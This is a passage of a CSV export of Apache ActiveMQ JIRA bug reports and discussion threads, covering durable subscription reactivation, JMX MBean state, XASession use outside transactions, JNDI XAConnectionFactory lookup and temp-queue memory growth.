10:09;dejanb;Fixed with svn revision 927324;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMX does not indicate durable subscription activity.,AMQ-2666,12483532,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,akos.baraz,akos.baraz,24/Mar/10 13:43,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"The ManagedRegionBroker.addInactiveSubscription adds the subscription to this domain: ""...Type=Subscription,active=false,name=..."". I don't know what this active=false part supposed to mean, but it puts the MBean to a strange path in the jconsole. What is not a big problem, but it is not managed by the rest of the code. Even if a subscription is inactivated the MBean in the ""Durable"" section shows active. If the subscription is active the ""false"" section contains an entry as it would be inactive.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Mar/10 13:44;akos.baraz;DurableSubscriptionReactivationTest3.java;https://issues.apache.org/jira/secure/attachment/12461604/DurableSubscriptionReactivationTest3.java","24/Mar/10 13:44;akos.baraz;activemq2.xml;https://issues.apache.org/jira/secure/attachment/12461605/activemq2.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60025,,,Tue Sep 20 11:01:40 UTC 2011,,,,,,,,,,,"0|i0akhz:",59594,,,,,,,,,,,,,,,,,,,,,"24/Mar/10 13:44;akos.baraz;junit testcase;;;","05/Aug/11 15:37;tabish;Working as designed.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscription re-activation failed when keepDurableSubsActive=true.,AMQ-2665,12483151,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,akos.baraz,akos.baraz,24/Mar/10 12:53,11/Jul/12 09:30,14/Jul/23 05:43,09/Jun/10 12:23,5.3.1,,,,,5.4.0,5.7.0,,,,,,0,,,,,,,,,"If the keepDurableSubsActive=true in the broker and there are pre-created topics (at startup) in the config xml, then every subscription re-activation increases the consumers list.
",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jun/10 14:15;akos.baraz;DurableSubscriptionReactivationTest2.java;https://issues.apache.org/jira/secure/attachment/12461730/DurableSubscriptionReactivationTest2.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74855,,,Wed Jul 11 09:30:07 UTC 2012,,,,,,,,,,,"0|i0aki7:",59595,,,,,,,,,,,,,,,,,,,,,"24/Mar/10 12:54;akos.baraz;here is a junit testcase.;;;","09/Jun/10 12:23;dejanb;Resolved with svn revision 952976;;;","11/Jul/12 09:30;dejanb;There was regression with this issue as keepDurableSubsActive wasn't properly propagated to the durable sub. It's fixed now with 1360085. Also take a look at [AMQ-3921];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed durable subscription re-activation when keepDurableSubsActive=false,AMQ-2663,12483150,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,akos.baraz,akos.baraz,24/Mar/10 09:31,09/Jun/10 10:34,14/Jul/23 05:43,09/Jun/10 10:34,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,If i set keepDurableSubsActive=false then i won't get the messages after re(!)-activation. I've figured out that the DurableTopicSubscription.deactivate() invokes StoreDurableSubscriberCursor.remove() what is removes the TopicStorePrefetch from the topic. Up to this point everyting is fine. But when the durable subscription becomes active the StoreDurableSubscriberCursor.add won't be called. So DurableTopicSubscription.activate() does not put the cursor back. ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/10 07:38;akos.baraz;DurableSubscriptionReactivationTest.java;https://issues.apache.org/jira/secure/attachment/12461732/DurableSubscriptionReactivationTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74856,,,Wed Jun 09 10:34:44 UTC 2010,,,,,,,,,,,"0|i0rqcn:",159913,,,,,,,,,,,,,,,,,,,,,"24/Mar/10 09:34;akos.baraz;Here is a testcase. If i set setKeepDurableSubsActive(true) then the test is passed.;;;","09/Jun/10 07:27;dejanb;Hi, can you grant ASF license to the test, so we can include the test in the project.;;;","09/Jun/10 07:38;akos.baraz;Granted. Thanks!;;;","09/Jun/10 10:34;dejanb;Fixed with svn revision 952946. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQEndpointWorker.stop() sometimes is needing many minutes to shutdown,AMQ-2662,12483654,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,joerg.wassmer,joerg.wassmer,24/Mar/10 05:17,08/Oct/11 18:42,14/Jul/23 05:43,28/Mar/11 12:36,5.3.0,,,,,5.5.0,,,JCA Container,,,,0,,,,,,,,,"On shutdowns the threads occasionally are waiting for a long time in ActiveMQEndpointWorker.stop() on the field ActiveMQEndpointWorker.shutdownMutex. The cause is that shutdownMutex is a string constant (initialization line is shutdownMutex = ""shutdownMutex""), effectively making it a global lock.
The hangs are happening especially on servers with high traffic.",irrelevant,rshinge,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Mar/11 22:16;joerg.wassmer;ActiveMQEndpointWorker.diff;https://issues.apache.org/jira/secure/attachment/12474741/ActiveMQEndpointWorker.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14607,,,Sat Oct 08 18:42:48 UTC 2011,,,,,,,,,,,"0|i0akif:",59596,,,,,,,,,,,,,,,,,,,,,"27/Mar/11 22:16;joerg.wassmer;Attached patch for trunk.;;;","28/Mar/11 12:36;gtully;patch applied with thanks.;;;","08/Oct/11 18:42;rshinge;Hi Gary - We are using AMQ 5.4.2 with J2EE Server and it hangs server during shutdown
ActiveMQEndpo I org.apache.activemq.ra.ActiveMQEndpointWorker stop Stopping

Where can I download fix for AMQ 5.4.2 JCA Resource Adapter?

Regards
Rahul ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMSException incorrectly thrown when using XAConnection/XASession outside a transaction,AMQ-2659,12482499,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rodos77,rodos77,19/Mar/10 16:31,03/Aug/21 07:23,14/Jul/23 05:43,13/Jun/18 10:53,5.3.0,,,,,5.16.0,5.4.0,,Broker,,,,0,,,,,,,,,"Currently, if one attempts to use an XAConnection (implemented by ActiveMQXAConnection) and consequently an XASession (implemented by ActiveMQXASession) outside a transaction, a JMSException is thrown.  However, nowhere in the JMS Spec does it say that if an XAConnection/XASession is used, it _*must*_ be enlisted in a transaction.  It is perfectly legal to _*not*_ start a transaction but still use the XA objects.

I propose that the following 2 methods in ActiveMQXASession be changed as follows to resolve this bug:
{noformat}
    public boolean getTransacted() throws JMSException {
        return getTransactionContext().isInXATransaction();
    }

    /**
     * This is called before transacted work is done by the session.
     * XA transactions are controlled outside of the session so
     * nothing has to be done here.  The only reason for this method
     * to be here is to override the parent.
     */
    protected void doStartTransaction() {
    }
{noformat}
\\
The current version of these methods is as follows (for reference):

{noformat}
    public boolean getTransacted() throws JMSException {
        return true;
    }

    /**
     * This is called before transacted work is done by
     * the session.  XA Work can only be done when this
     * XA resource is associated with an Xid.
     *
     * @throws JMSException not associated with an Xid
     */
    protected void doStartTransaction() throws JMSException {

        if (!getTransactionContext().isInXATransaction()) {
            throw new JMSException(""Session's XAResource has not been enlisted in a distributed transaction."");
        }

    }
{noformat}",,cshannon,gtully,jira-bot,rodos77,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-8213,,,,,,,,,,,,,"28/Apr/10 15:44;rodos77;JMSConsumerTestXA.java;https://issues.apache.org/jira/secure/attachment/12461685/JMSConsumerTestXA.java","28/Apr/10 15:44;rodos77;JmsTestSupportXA.java;https://issues.apache.org/jira/secure/attachment/12461684/JmsTestSupportXA.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14717,,,Mon Jul 30 16:13:54 UTC 2018,,,,,,,,,,,"0|i0b9t3:",63701,,,,,,,,,,,,,,,,,,,,,"20/Apr/10 16:24;gtully;what is your use case here? it is normal for an xa connection to be used with an xa transaction, that is what xa_rdonly is about. Not sure why the check was added in the first place but it has been around for quite a while and is a good indication of intent, as in, it helps determine whether an XA connection factory is being used as desired when it is configured with a transaction manager. I am slow to drop it without out good reason.;;;","20/Apr/10 16:56;rodos77;The use case is that when the JMS client calls createConnection on the connection factory handle, an XA tx may have been started or may not have been.  The RA has no way of knowing this.  Therefore, we configure the RA to always use XAConnectionFactory.  This way, if a tx was started, the XA capabilities of the connection will be used, and if not, they won't, but it should work in either case.

Without this change, I get an Exception when trying to use the AMQXAConnFactory/AMQXAConn when a tx has not been started.  I've had to make this change to make our RA work with AMQ.  Other JMS engines (such as JBoss) don't have this restriction.  Nor do the JMS and JCA specify anywhere that if XA objects are used, a tx MUST be started.;;;","26/Apr/10 14:12;rodos77;So what's the verdict?  Can we get this change into 5.4.0 so I can use AMQ with our RA and not have to patch the source on my end?;;;","26/Apr/10 15:18;gtully;to speed up the process, it would help if there were a few unit tests that demonstrated the required behavior and don't break anything else. I think message receipt will be problematic as an XASession is always transacted w.r.t acks and without a transaction there will be no ack.

btw: I think the change to getTransacted() will help with https://issues.apache.org/activemq/browse/AMQ-2712 which is good.;;;","27/Apr/10 17:36;rodos77;Isn't an ack sent at the end of ActiveMQSession.run() irrespective of whether there is a tx in progress or not?  line 885 in 5.3.1: asyncSendPacket(ack).  In fact, ActiveMQXASession doesn't override this so it will always execute the code in ActiveMQSession which surely can run without a tx.

I will work on a junit test shortly...;;;","27/Apr/10 17:52;gtully;yea, in the run() case it is. The issue is for other regular users of jms who swap in an XA connection factory for a regular connection factory and use an XASession as a regular session without a transaction, currently they will get an exception but with the proposed changes they will not and they are into undefined behavior.
The point being that this change has implications beyond the RA use case. A variant of the org.apache.activemq.JMSConsumerTest with an XA connection factory will demonstrate the problems that the current exception is trying to avoid. From a normal JMS user perspective, Session and XASession are not the same.

Maybe the way out of this is again through configuration, making the check for an active XA transaction optional, so it can be disabled for power users.
;;;","27/Apr/10 18:15;rodos77;I still don't understand why using XASession without a tx is ""undefined behavior"".  No, they are not the same.  XASession has additional functionality but should still work as a regular session in the absence of tx. After all, XASession extends Session so even by the API an XASession can be treated as a regular Session.  In fact, the JMS client will always get a regular Session to work with.  However, the RA may instantiate an XASession behind the scenes.

If we make this change and modify JMSConsumerTest to use XASession, what problem are you expecting to occur?

;;;","28/Apr/10 15:42;rodos77;Ok, so I modified JMSConsumerTest to use XASession (attached).  I did initially see some problems and now understand what you were talking about.  However, I was able to get rid of the problem and make the tests pass by including the following method in ActiveMQXASession: \\ \\
{noformat}
    public boolean isAutoAcknowledge() {
       return true;
    }
{noformat}

I think this makes sense since for an XASession transactions are controlled outside of the session and so as far as the session is concerned it is always AUTO_ACKNOWLEDGE.

This would take care of your concerns, no?

P.S.  There are 4 failures in the test but I think those are because the tests don't make sense any more with the transactions not controlled by the session.  Sorry, I don't have more time right now to look into it further.;;;","18/May/10 16:31;rodos77;Hi Gary,

Did you have a chance to run the attached test and check the additional proposed change?  Does it satisfy your concerns?  Can these changes be adopted?  I think in this case it is better to make it work for all use cases as opposed to going the config route.;;;","18/May/10 16:54;gtully;will try and find some time for this before the 5.4 release;;;","06/Aug/10 17:07;gtully;changes implemented in r983057
thanks for the test case etc.;;;","13/Jun/18 10:41;gtully;Revisiting this, I now think the change needs to be configurable.

I came across a use case with an XASession and consumer.receive(timeout) where the XA transaction rolls back before the timeout and where the subsequent received message gets auto acked in error, effectively loosing a message. Before this change, the doStartTransaction would throw and the receive would fail.

Because the lifecycle of the transaction is independent of the consumer and session, having the session work without a transaction will leave the potential for holes in transacted work. It should not be enabled by default.

 

In addition, XASession.getTransacted() should always return true  as per the [javadoc|https://docs.oracle.com/javaee/5/api/javax/jms/XASession.html#getTransacted()], not sure why that was missed 6years ago.

I will rework the changes to allow the use of an xasession outside of a transaction once there is an explicit request to use a non transacted ack mode via setXaAckMode.

By default, work outside an xa transaction will throw an error as it should.;;;","13/Jun/18 10:48;jira-bot;Commit 004be56127e7e949c8ffff8c36435ea0f27d32d4 in activemq's branch refs/heads/master from gtully
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=004be56 ]

AMQ-2659 - make configurable based on xaAckMode, otherwise pure xa case can default to autoack in error. Additional tests
;;;","13/Jun/18 10:53;gtully;To use a non transacted ack mode in XASessions, it now needs to be explicitly enabled via the xaAckMode accessor. Either through the brokerURI or via the setter.
{code:java}
ActiveMQXAConnectionFactory activeMQXAConnectionFactory = new ActiveMQXAConnectionFactory(""vm://localhost?jms.xaAckMode=1"");

// or
activeMQXAConnectionFactory.setXaAckMode(Session.AUTO_ACKNOWLEDGE);{code};;;","30/Jul/18 11:37;cshannon;[~gtully] - it looks like your latest commit broke this test: [https://builds.apache.org/view/A/view/ActiveMQ/job/ActiveMQ-Java8/lastBuild/org.apache.activemq$activemq-karaf-itest/testReport/org.apache.activemq.karaf.itest/ActiveMQBrokerNdCamelFeatureTest/test/]

Do we need to configure something different now with camel for XA or is this a regression?;;;","30/Jul/18 13:07;jira-bot;Commit 18543080a04b3612708464eb32e9975a8eb974f6 in activemq's branch refs/heads/master from gtully
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=1854308 ]

AMQ-2659 - fix camel route config to reflect revised behaviour
;;;","30/Jul/18 13:08;gtully;[~cshannon] thanks for the heads up, apologies. yes - the config for that non transacted route with an xa connection factory needed to be updated after this change. sorted now.;;;","30/Jul/18 16:13;cshannon;[~gtully] - no problem thanks for fixing that, I was just verifying this morning all the tests work as I am about to do a 5.15.5 release and noticed that the Camel test had broke in Jenkins;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"temp-queue - no producer, no consumer -> messagecount ",AMQ-2657,12483605,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,lucious,lucious,18/Mar/10 22:13,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"HI,

I tried the latest snapshot 12.03.2010, several producers and consumers. No matter what I change in activemq.xml file I always end up with memorylimit and broker is ""frozen"". However today I found one really strange thing. Maybe this is something wrong with what JMX says but: several temp-queues with  ConsumerCount=0, ProducerCount=0 but EnqueueCount was getting up and up and Dequeue was 0 all the time . This way MemoryPercentageUsage got to 100% and AMQ said again something like this:

2010-03-16 15:02:28,455 | INFO  | Usage Manager Memory Limit reached on temp-queue://e0499daa-604e-227c-57c5-8a700a83d690:0. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more info | org.apache.activemq.broker.region.Queue | ActiveMQ Transport: tcp:///127.0.0.1:46737 

My config file is attached. All producers and consumers use CMS -3.0.1. and 3.1.1.

",,lucious,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/10 22:17;lucious;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461567/activemq.xml","19/Mar/10 16:37;lucious;jms1.png;https://issues.apache.org/jira/secure/attachment/12461363/jms1.png","19/Mar/10 16:37;lucious;jms2.png;https://issues.apache.org/jira/secure/attachment/12461365/jms2.png","19/Mar/10 16:37;lucious;jms3.png;https://issues.apache.org/jira/secure/attachment/12461612/jms3.png",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60033,,,Tue Sep 20 11:01:39 UTC 2011,,,,,,,,,,,"0|i0akin:",59597,,,,,,,,,,,,,,,,,,,,,"18/Mar/10 22:17;lucious;My configuration file;;;","19/Mar/10 16:37;lucious;Some screenshots from todays testing. There was one temp-queue without Consumer and Producer but with EnqueueCount counting. I had to do Purge on this queue from time to time - and memory was released. ;;;","22/Mar/10 09:26;lucious;Hi It's me again... I found I think which can be helpful... Today I had network problem with my one of my ISPs. So for about 20sec all clients connected via AMQ lost connection. After that time they had to reconnect although temp-queues kept ""safe"" in AMQ and now I have to purge them every  10-20 minutes to not get ""memory exhausted"" on temp-queue.;;;","20/Jul/10 10:38;rajdavies;Downgrading this to a major bug. I can't reproduce it - would like to know if its possible to add an expiration to the messages.
Also  - in 5.4 is the option to garbage collect unused destinations- which may help. 
Do you know the types of messages being enqueued ?;;;","03/Aug/10 07:14;lucious;Hi Rob,

First of all I didn't get any notification regarding your comment so could react faster. But anyway... 
1. What's the option in 5.4 for garbage unused destinations ? 
2. Regarding messages types: well I'm not a programmer but we use AMQ for Order management System -> so we're sending ""orders"", ""transactions"" to and from exchanges. So rather text messages max 1k -> is there a way to ""mirror"" messages to so exactly what is being sent?
3. We have now simple script in jruby to ""clean"" ""unconnected"" temp-queues"" so in 5.3.2 there is still this problem. I can test 5.4 if there is some relevant change to provide latest update if you need?
;;;","11/Aug/11 15:46;tabish;Use of the Inactive Destination Garbage Collection feature will resolve issues like this.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQInitialConnectionFactory cannot return an XAConnectionFactory,AMQ-2656,12483476,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,edan,edan,18/Mar/10 19:51,11/Jul/12 11:41,14/Jul/23 05:43,11/Jul/12 11:41,5.3.0,,,,,5.4.0,5.7.0,,JMS client,,,,0,,,,,,,,,"ActiveMQInitialContextFactory cannot resolve the name ""XAConnectionFactory""  a la:

INFO: JNDI API lookup failed: javax.naming.NameNotFoundException: XAConnectionFactory

This prevents using the builtin JNDI service in an XA transaction context.  I've created a simple patch to workaround this and discussed it on the mailing list:  http://old.nabble.com/ActiveMQ%27s-JNDI-does-not-resolve-XAConnectionFactory-td27936255.html

",,gtully,hindsbeans,sapunce,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2670,,,"19/Mar/10 03:05;edan;ActiveMQInitialContextFactory.java;https://issues.apache.org/jira/secure/attachment/12461576/ActiveMQInitialContextFactory.java","18/Mar/10 20:20;edan;ActiveMQInitialContextFactory.java;https://issues.apache.org/jira/secure/attachment/12461439/ActiveMQInitialContextFactory.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74857,,,Wed Jul 11 11:41:21 UTC 2012,,,,,,,,,,,"0|i0akiv:",59598,,,,,,,,,,,,,,,,,,,,,"18/Mar/10 20:05;gtully;added support for a boolean xa property in the environment which will cause an xa connection factory to be created. r924972
{code}xa=true{code}
or on a lookup name basis
{code}connection.<name>.xa=true{code}
will result in an XAConnectionFactory being created.
;;;","18/Mar/10 20:20;edan;This is my patched version that allows me to jndiContext.lookup(""XAConnectionFactory"") and get a working XAConnectionFactory.
;;;","18/Mar/10 20:24;edan;Gary, will your patch (I can't see it yet) allow me to JNDI lookup ""XAConnectionFactory""  ?  That may be all I have available in webMethods ""JNDI Provider Alias"" settings.  I guess I can try to lookup connection.MyConnection or something along those lines.;;;","18/Mar/10 20:45;gtully;check out the subversion commits tag to see the changes.

It may not be enough for you if you cannot augment the environment to add the xa=true property.
there is also a property for the connectionFactoryNames where you can provide the list of names you will expect. This overrides the DEFAULT_CONNECTION_FACTORY_NAMES;;;","19/Mar/10 01:31;edan;At least from work, it took a while for the source code to show up in Crucible.  I saw it before I left work, but I wasn't able to get it to work.  I'll try again tomorrow, but I get ClassCastException trying to cast ActiveMQConnectionFactory to ActiveMQXAConnectionFactory.  Maybe that should work since it's a subclass, but that error makes me doubtful :)  So far I've only been successful with my patch which returns an ActiveMQXAConnectionFactory specifically.

From within webMethods, I can set ""other properties"" which seem to be ""jndi.properties.""   I tried adding ""MyConnection"" to my custom list of connectionFactoryNames, but I was unsuccessful performing a context.lookup() on ""MyConnection.xa=true"" or ""connection.MyConnection.xa=true"" ...

If I can get your patch working, I still want to modify the DEFAULT_CONNECTION_FACTORY_NAMES to include ""XAConnectionFactory"" to make it available as easily as the other standard JMS types.  Thanks for your help on this :);;;","19/Mar/10 03:05;edan;This version is based on the latest svn but adds an XAConnectionFactory to the default list of factories, and sets the ""xa"" environment value manually for that factory during creation.  I was able to test the original patch successfully, and this patch lets me lookup ""XAConnectionFactory"" via the JNDI context which I believe will be required to easily integrate with webMethods.

Maybe it should be a regexp so any custom connection name with ""XA"" will get the treatment?  *shrug*  I guess I think that at a minimum, a default connection factory name like ""XAConnectionFactory"" should work without setting environment variables.  But I what do I know, seriously...   ;);;;","19/Mar/10 11:19;gtully;If you can specify in other properties:
{code}
connectionFactoryNames=XAConnectionFactory
xa=true
{code}

then:
{code}context.lookup(""XAConnectionFactory""){code} will be an instanceof XAConnectionFactory;;;","19/Mar/10 15:46;edan;Thanks for the pointers on the properties.  I was able to just have a line with ""xa=true"" in both my jndi.properties for my standalone java client test and the ""Other Properties"" in webMethods and create an ""XA"" transaction by just looking up ""ConnectionFactory.""  It seems to apply to all ConnectionFactory lookups, though, so my standalone java client gets an exception when sending a message:

javax.jms.JMSException: Session's XAResource has not been enlisted in a distributed transaction.

I assume there is no way to limit the xa=true property to a particular connection factory lookup with this method.  (If I use your snippet above a lookup of ""ConnectionFactory"" fails, for instance.)  It seems less desirable to me to be forced into creating separate processes or JNDI Providers in webMethods to do XA or not.  But I can work with the patch you have submitted for 5.4.0, as opposed to current.  Once we've had a chance to test out the current patch in webMethods more, perhaps we will see if it is a big of a pain or not.  

I'm tempted to keep my patch locally, as it strikes me as much easier to remember ""just look up XAConnectionFactory if that's what you need"" as opposed to configuring the environment.  OTOH, it may be harder to remember to keep my local patch when we upgrade someday :)  Thanks again.;;;","19/Mar/10 15:53;gtully;you are nearly there, try{code}
connectionFactoryNames=XAConnectionFactory,ConnectionFactory
connection.XAConnectionFactory.xa=true
{code}

and you can lookup both an xa and non xa connectonfactory by their respective names.;;;","23/Mar/10 20:14;edan;Why didn't you mention that in the first place!?!?!   Oh... Because you did... DOH!

Ok, that is working fine for both my Java client test and our webMethods environment, even as far as verifying a transaction can be rolled back.    I still think XAConnectionFactory should be available without additional configuration, for instance, just yesterday I had to remind a coworker to copy the properties configuration after setting up a new system :)

But this is working and I don't want to be too pushy with my first reported issue :)  Thanks a lot for the help.;;;","01/Sep/10 14:37;sapunce;Hello Gary and Edan, 

I have the same problem using the XAConnectionFactory with ActiveMQ. 
Could please tell me is this patch released and how can I use it?

Regards,
Nace;;;","01/Sep/10 15:25;gtully;it is in 5.4.0, see the fix version above and the comment: https://issues.apache.org/activemq/browse/AMQ-2656?focusedCommentId=58336&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#action_58336

that has details of the properties.
There is also a test you can browse: 
http://fisheye6.cenqua.com/browse/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/jndi/XAConnectionFactoryTest.java;;;","02/Sep/10 10:32;sapunce;Thanks for your fast response Gary. Yes it works for me.

Thanks again, 
Nace;;;","25/Jan/11 14:52;hindsbeans;Gary, thanks for your help on this. In the end I had to use the version of ActiveMQInitialContextFactory.java as attached by Edan idzerda at 2010-03-18 11:05 PM. I had a search through the ActiveMQ issue tracker and couldn't find if Edan's suggested code was ever added to core - do you know if it was? It would be very useful if it was for cases like the one I have outlined below where the setting up of the jndi environment is abstracted up out of the code. (i.e. in websphere you cannot define the 'xa=true' property anywhere - hence Edan's 'XAConnection' jndi name is invaluable!

For anybody else trying to get a connection to ActiveMQ within a WebSphere7.0.0-managed XA transaction and getting an error of ""An illegal attempt to commit a one phase capable resource with existing two phase capable resources has occured"" in the WebSphere SystemOut.log. This error was thrown when a Message Driven Bean was fired from a WebSphere default jms queue and it tried to write a message to an ActiveMQ queue all within an XA transaction. There was an Oracle db write in the same transaction also. Here are the steps to get around it:

1) Use the attached file kindly attached by Edan at 2010-03-18 11:05 PM to compile activemq-5.4.0.

2) In WebSphere Admin Console, create a new JMS provider:
i) Resources > JMS > JMS providers > New
ii) Use the following:
    Name: use a name like 'ActiveMQ 5.4.0'
    Classpath: add the paths to the following jar files (each path needs to be on a new line in the text box) activemq-all-5.4.0.jar, commons-logging-1.1.jar, geronimo-j2ee-management_1.1_spec-1.0.1.jar
    External Initial Context Factory: org.apache.activemq.jndi.ActiveMQWASInitialContextFactory
    External Provider URL: tcp://localhost:61616

3) In WebSphere Admin Console, create a new ConnectionFactory
i) Resources > JMS > Connection factories > New
ii) Use the following:
    Name: use a name like 'ActiveMQ 5.4.0 Connection Factory'
    JNDI name: jmsfactory/activemq540connfactory (this will be the name that any WebSphere-run apps will lookup using jndi)
    External JNDI name: XAConnectionFactory (this is the new name added by Edan's code in step 1 above - basically, when you're code running in WebSphere calls 'jmsfactory/activemq540connfactory', WebSphere does a call to activemq using this jndi name, i.e. XAConnectionFactory )

;;;","25/Jan/11 15:29;gtully;@peter, thanks for closing the loop on this with the feeback.
So in 2.ii or 3.i - there is no possibility to specify an additional property for the jndi environment?
not good. 

So either we have a hardcoded xaconnection factory, Edan's fix, or the 'xa=true' jndi env property needs to be embedded in the 2.ii external provider url, like tcp://localhost:61616?jndi.xa=true;;;","25/Jan/11 16:56;hindsbeans;In websphere there are options in 2.ii and 3.i to add what are called 'custom properties' but these do not get translated into jndi environment properties unfortulately.

In terms of which route to take I would say that the provider url should be left intact. To me it would be more intuitive if the name you supply to a jndi lookup call determines if an ActiveMQXAConnectionFactory or an ActiveMQConnectionFactory is returned as opposed to the provider url used to create the InitialContext. I guess setting it in the provider url abstracts it away from where it is relevant, which is in the jndi lookup call. As in all things though, this is just my opinion - and I'm more than wiling to be corrected!

Using the 'XAConnectionFactory' jndi name also has the additional benefit of leaving the well recognised url of 'tcp://localhost:61616' untouched as well as being tried and tested - thanks to Edan!!

;;;","28/Jan/11 20:21;gtully;opening so we don't forget to add a hard coded xa factory name.;;;","11/Jul/12 11:41;gtully;
